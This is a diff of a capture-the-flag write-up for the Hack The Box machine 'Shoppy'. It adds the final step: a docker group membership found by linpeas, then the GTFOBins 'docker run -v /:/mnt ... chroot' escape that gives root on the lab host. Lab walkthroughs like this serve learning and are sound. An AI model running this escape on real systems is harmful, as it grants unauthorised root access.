@@ -1,5 +1,6 @@
-# Shoppy WIP
+# Shoppy
 ## Start: 27/10/2022
+## End:   06/11/2022
 
 ### IP: 10.10.11.180
 
@@ -276,5 +277,27 @@ Access granted! Here is creds !
 Deploy Creds :
 username: deploy
 password: D********!
+
 ```
 And with that we have another user's credentials!
+
+I'm going to run linpeas on this new user we have acess to now, the most important piece of information is the fact the user can run docker containers without sudo, using docker can allow us to mount our own file system but to gain all permissions over those files as we are tecnically root within the docker container. An easy command for this is shown on GTFOBins(https://gtfobins.github.io/gtfobins/docker/)
+
+```
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+
+```
+So lets run that docker command 
+```
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# ls /root/
+root.txt
+
+```
+And now we have root filesystem access! Mission complete
+
+So i think for next time i'll seperate out enumeration and run not just nmap but gobuster dir and vhost against the target but all in all this system wasn't too difficult!
